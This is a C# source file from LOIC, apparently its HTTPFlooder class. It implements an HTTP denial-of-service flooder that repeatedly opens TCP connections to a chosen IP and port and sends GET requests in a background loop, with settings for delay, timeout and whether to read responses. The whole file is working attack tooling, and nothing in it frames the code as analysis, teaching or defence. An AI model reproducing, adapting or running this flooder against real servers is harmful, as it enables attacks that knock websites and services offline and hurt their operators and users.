using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace LOIC
{
	class HTTPFlooder : IFlooder
	{
		#region Fields
		private BackgroundWorker bw;
		private long lastAction;
		private Random random = new Random();
		private Timer tTimepoll = new Timer();
		#endregion

		#region Constructors
		public HTTPFlooder(string ip, int port, string subSite, bool resp, int delay, int timeout)
		{
			this.IP = ip;
			this.Port = port;
			this.Subsite = subSite;
			this.Resp = resp;
			this.Delay = delay;
			this.Timeout = timeout;
		}
		#endregion

		#region Properties
		public int Delay        { get; set; }
		public int Downloaded   { get; set; }
		public int Requested    { get; set; }
		public int Failed       { get; set; }
		public bool IsFlooding  { get; set; }
		public string IP        { get; set; }
		public int Port         { get; set; }
    	public bool Resp        { get; set; }
		public ReqState State   { get; set; }
		public string Subsite   { get; set; }
		public int Timeout      { get; set; }
		#endregion

		#region Methods
		public void Start()
		{
			this.IsFlooding = true;
			lastAction = Tick();

			tTimepoll = new Timer();
			tTimepoll.Tick += new EventHandler(tTimepoll_Tick);
			tTimepoll.Start();

			this.bw = new BackgroundWorker();
			this.bw.DoWork += new DoWorkEventHandler(bw_DoWork);
			this.bw.RunWorkerAsync();
			this.bw.WorkerSupportsCancellation = true;
		}

        public void Stop()
        {
			this.IsFlooding = false;
            this.bw.CancelAsync();
        }

		private static long Tick()
		{
			return DateTime.Now.Ticks / 10000;
		}
		#endregion

		#region Event handlers
		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.0{1}{1}{1}", Subsite, Environment.NewLine));
				var host = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
				while (this.IsFlooding)
				{
					this.State = ReqState.Ready; // SET this.State TO READY //
					lastAction = Tick();
					byte[] recvBuf = new byte[64];
					var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					this.State = ReqState.Connecting; // SET this.State TO CONNECTING //
					socket.Connect(host);
					socket.Blocking = Resp;
					this.State = ReqState.Requesting; // SET this.State TO REQUESTING //
					socket.Send(buf, SocketFlags.None);
					this.State = ReqState.Downloading; Requested++; // SET this.State TO DOWNLOADING // REQUESTED++
					if (Resp) socket.Receive(recvBuf, 64, SocketFlags.None);
					this.State = ReqState.Completed; Downloaded++; // SET this.State TO COMPLETED // DOWNLOADED++
					tTimepoll.Stop();
					if (Delay > 0) System.Threading.Thread.Sleep(Delay);
				}
			}
			catch { }
			finally { IsFlooding = false; }
		}

		private void tTimepoll_Tick(object sender, EventArgs e)
		{
			if (Tick() > lastAction + Timeout)
			{
				this.IsFlooding = false;
				this.Failed++;
				this.State = ReqState.Failed;
			}
		}
		#endregion
	}
}
